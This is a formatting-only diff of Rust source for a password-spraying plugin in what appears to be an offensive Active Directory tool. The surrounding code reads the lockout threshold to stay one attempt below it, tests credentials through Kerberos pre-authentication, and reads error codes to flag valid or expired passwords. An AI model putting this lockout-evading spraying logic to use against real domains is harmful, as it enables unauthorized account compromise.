@@ -1,8 +1,8 @@
 //! Built-in plugin example — serves as a template for writing Overthrone plugins
 
 use super::{
-    Plugin, PluginArgDef, PluginArgType, PluginCapability,
-    PluginCommand, PluginContext, PluginEvent, PluginManifest, PluginResult, PluginType,
+    Plugin, PluginArgDef, PluginArgType, PluginCapability, PluginCommand, PluginContext,
+    PluginEvent, PluginManifest, PluginResult, PluginType,
 };
 use crate::error::Result;
 use async_trait::async_trait;
@@ -117,13 +117,14 @@ impl Plugin for SmartSprayPlugin {
         if let Ok(graph) = ctx.graph.read() {
             // Look for password policy info in graph metadata
             if let Some(lockout) = graph.metadata().get("lockout_threshold")
-                && let Ok(val) = lockout.parse::<u32>() {
-                    self.lockout_threshold = val.saturating_sub(1); // Stay 1 below
-                    ctx.log_info(&format!(
-                        "Detected lockout threshold: {} (will stop at {})",
-                        val, self.lockout_threshold
-                    ));
-                }
+                && let Ok(val) = lockout.parse::<u32>()
+            {
+                self.lockout_threshold = val.saturating_sub(1); // Stay 1 below
+                ctx.log_info(&format!(
+                    "Detected lockout threshold: {} (will stop at {})",
+                    val, self.lockout_threshold
+                ));
+            }
         }
 
         Ok(())
@@ -147,10 +148,11 @@ impl Plugin for SmartSprayPlugin {
 
     async fn on_event(&self, event: &PluginEvent, ctx: &PluginContext) -> Result<()> {
         if let PluginEvent::CredentialFound {
-                username,
-                credential_type,
-                domain,
-            } = event {
+            username,
+            credential_type,
+            domain,
+        } = event
+        {
             ctx.log_info(&format!(
                 "Credential found for {}@{} ({}), adjusting spray targets",
                 username, domain, credential_type
@@ -258,10 +260,8 @@ impl SmartSprayPlugin {
                 }
 
                 // Kerberos AS-REQ pre-auth check — if TGT is returned, creds are valid
-                match crate::proto::kerberos::request_tgt(
-                    &dc_ip, &domain, user, password, false,
-                )
-                .await
+                match crate::proto::kerberos::request_tgt(&dc_ip, &domain, user, password, false)
+                    .await
                 {
                     Ok(_tgt) => {
                         ctx.log_attack(&format!("VALID: {}:{}", user, password));
@@ -272,9 +272,7 @@ impl SmartSprayPlugin {
                     }
                     Err(e) => {
                         let err_str = e.to_string();
-                        if err_str.contains("KRB_ERROR 24")
-                            || err_str.contains("PREAUTH_FAILED")
-                        {
+                        if err_str.contains("KRB_ERROR 24") || err_str.contains("PREAUTH_FAILED") {
                             // Wrong password — expected, increment tracker
                         } else if err_str.contains("KRB_ERROR 18")
                             || err_str.contains("CLIENT_REVOKED")
@@ -286,10 +284,7 @@ impl SmartSprayPlugin {
                         {
                             // Password expired but IS valid
                             found.push(format!("{}:{} (EXPIRED)", user, password));
-                            ctx.log_attack(&format!(
-                                "VALID (expired): {}:{}",
-                                user, password
-                            ));
+                            ctx.log_attack(&format!("VALID (expired): {}:{}", user, password));
                         } else {
                             // Other Kerberos error
                             ctx.log_warn(&format!(
